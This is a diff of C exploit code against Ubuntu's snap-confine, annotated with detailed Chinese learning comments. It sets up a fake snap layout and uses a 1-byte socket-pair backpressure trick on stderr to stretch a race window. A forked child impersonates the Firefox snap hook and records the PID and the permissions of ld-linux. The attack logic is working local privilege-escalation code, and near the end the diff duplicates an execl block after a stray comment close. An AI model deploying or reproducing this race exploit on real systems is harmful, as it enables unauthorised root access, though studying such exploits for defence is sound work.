@@ -125,9 +125,9 @@ static int setup_snap_and_exchange(const char *payload_so)
             ssize_t len = readlink(src, link, sizeof(link)-1);
                                          // sizeof(link)-1 ，最多读取多少字节，-1 是为了后面手动加 \0，，，readlink 不会自动加 '\0'
                                          //读取“符号链接指向哪里”，放进 link 这个字符串里，libc.so  →  libc.so.6，，，libc.so 只是一个“快捷方式”，真正的文件是 libc.so.6，，，不是复制文件内容！而是读取“它指向谁”
-            if (len > 0) { link[len] = '\0'; symlink(link, dst); }    
+            if (len > 0) { link[len] = '\0'; symlink(link, dst); }    //创建符号链接（symbolic link),link被指向的目标， dst创建出来的符号链接路径，在 dst 这个位置，创建一个“快捷方式”，指向 link   
         } else {
-            copy_file(src, dst);
+            copy_file(src, dst);    //把 src 文件的内容复制到 dst 文件
         }
         count++;
     }
@@ -137,30 +137,28 @@ static int setup_snap_and_exchange(const char *payload_so)
 }
 
 /*
- * create_stderr_socket()
- *
- * Creates a UNIX socket pair with minimal buffers (≈1 byte).
- *
- * Backpressure trick:
- *-snap-confine writes debug output to stderr (socket)
- *-Buffer fills almost immediately-> write() blocks
- *-Each read() by us frees 1 byte-> briefly unblocks it
- *
- * Result: we control execution byte-by-byte, effectively turning
- * a tiny race window into a controllable pause.
+ * 创建标准错误套接字（函数）*
+ * 创建一个具有最小缓冲区（约 1 字节）的 UNIX 套接字对。*
+ * 回压技巧：
+ * - 快照限制将调试输出写入标准错误（套接字）
+ * - 缓冲区几乎立即填满 -> 写入（）阻塞
+ * - 我们的每次读取（）释放 1 字节 -> 短暂解除阻塞*
+ * 结果是：我们能够逐字节控制执行，从而有效地将一个极小的竞态窗口转变为可控的暂停。
  */
+//创建一对“极小缓冲”的本地 socket，用来人为制造阻塞（backpressure），常用于劫持/控制 stderr 的写入节奏
 static int create_stderr_socket(int *read_fd, int *write_fd)
 {
-    int sv[2];
+    int sv[2];    //创建一对本地全双工通信管道,sv[0] ↔ sv[1] 双向通信,socketpair创建一对本地通信 socket（双向管道）
 
-    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
-        perror("socketpair"); return-1;
-    }
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {    //AF_UNIX 本地进程通信（不走网络）,SOCK_STREAN 类似 TCP 的可靠字节流,0默认协议,sv输出的两个 fd（数组）
+        perror("socketpair"); return-1;    //perror 错误输出
+    }    //socketpair 返回值：0成功，-1失败
     /*
-     * Set buffer sizes to 1 byte.
-     * The kernel may round up to its minimum, but the effect is the same:
-     * snap-confine blocks after writing just a few bytes.
+     * 将缓冲区大小设置为 1 字节
+     * 内核可能会向上取整到其最小值，但效果是一样的
+     * 在写入仅几字节后就会进行限制
      */
+    //核心操作：把 buffer 调到极小,“阻塞 stderr 输出” 技术,sv[0] ↔ sv[1] 这两个 fd 可以互相读写
     int bufsize = 1;
     setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
     setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
@@ -172,40 +170,63 @@ static int create_stderr_socket(int *read_fd, int *write_fd)
 }
 
 /* 
- * run_and_race()
- * Main race logic:
- *-Creates the backpressure socket pair
- *-Read output byte-by-byte
- *-Detect trigger
- *-Swap directories
+ * run_and_race() 运行与赛跑()
+ * Main race logic:主赛跑逻辑：
+ *-Creates the backpressure socket pair - 创建反向压力套接字对
+ *-Read output byte-by-byte- 逐字节读取输出
+ *-Detect trigger - 检测触发信号
+ *-Swap directories- 切换目录
  */
+//父进程制造一个“会阻塞 stderr 的 socket”，子进程伪装成 snap-confine，在执行关键 system 操作前进入可控阻塞状态，用于制造 race condition 时间窗口
 static int run_and_race(void)
 {
     int read_fd;
-    int write_fd;
+    int write_fd;    //给 child 用（写 stderr）
     if (create_stderr_socket(&read_fd, &write_fd) < 0)
         return-1;
-    pid_t pid = fork();
-
+    pid_t pid = fork();    //fork：制造攻击结构  //fork() 会：复制当前进程 → 生成一个“几乎完全一样的新进程” //pid_t是类型type,专门用来存“进程ID”的整数类型
+                            //pid 这是一个变量，用来存：fork() 的返回值,关键：pid不是“进程”，是“标记”
     if (pid < 0) {
         perror("fork");
         return-1;
     }
     if (pid == 0) {
-        /* Child: become snap-confine */
-        close(read_fd);
-        /* Redirect stderr to the write end of our backpressure socket */
-        dup2(write_fd, STDERR_FILENO);
-        close(write_fd);
-        clearenv();
-        /* Enable verbose debug output (used for trigger detection) */
-        setenv("SNAPD_DEBUG", "1", 1);
-        setenv("SNAP_INSTANCE_NAME", "firefox", 1);
+        /* Child 子进程: become snap-confine 容器 */
+        close(read_fd);    //read_fd 是 socketpair 的“读端”，子进程只保留“写端”，避免干扰或死锁
+        /* 将stderr重定向到背压套接字的写端 */
+        dup2(write_fd, STDERR_FILENO);    //劫持 stderr，把：stderr（标准错误输出），重定向到：socket 的 write_fd
+        //STDERR_FILENO 是一个宏（macro）常量：标准错误输出（stderr）的文件描述符编号，STDERR_FILENO = 2代表“错误输出通道”
+        //dup2(oldfd, newfd);把一个文件描述符“复制/重定向”到另一个固定位置，把“标准错误输出（fd=2）”改成指向 write_fd，把“错误输出”变成攻击工具
+        //把 STDERR（fd=2）改成“指向 write_fd”，stderr 的输出目标变成 write_fd
+        //stderr 的“目标”其实是一个 文件描述符 2 指向的设备（终端屏幕上） 默认 fd 2 → /dev/tty（当前终端）
+        //dup2(write_fd, 2); 变成2 → socket(write_fd)
+        close(write_fd);//关闭原始 write_fd，原 fd 不再需要，避免 fd 泄漏
+        clearenv();    //清空环境变量
+        /* 启用详细调试输出（用于触发检测） */
+        setenv("SNAPD_DEBUG", "1", 1);    //开启 debug 模式，debug = 更多日志输出 = 更多 stderr 写入
+                                        //直接增加：socket 写压力，阻塞概率，race 成功率
+        setenv("SNAP_INSTANCE_NAME", "firefox", 1);    //伪装当前 snap 实例是：Firefox snap
+        //setenv() 是 Linux/Unix 下用来设置环境变量的函数。
+        //int setenv(const char *name, const char *value, int overwrite);
+        //int setenv(变量名，value值， overwrite是否覆盖0为不覆盖（如果已存在就不改）1为覆盖（强制修改）
 
         /*
         * Run snap-confine:
-        *-write PID + perms for verification
-        *-keep namespace alive
+        *-write PID + perms for verification 写PID + perms进行验证
+        *-keep namespace alive 保持命名空间存活
+        */
+        execl(SNAP_CONFINE, "snap-confine",
+              "--base", "core22",
+              "snap.firefox.hook.configure",
+              "/bin/sh", "-c",
+              "echo $$ > /tmp/race_pid.txt; "
+              "stat-c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
+              "> /tmp/race_perms.txt 2>&1; "
+              "sleep 99994",
+              NULL);
+        _exit(1);
+    }
+
         */
         execl(SNAP_CONFINE, "snap-confine",
               "--base", "core22",
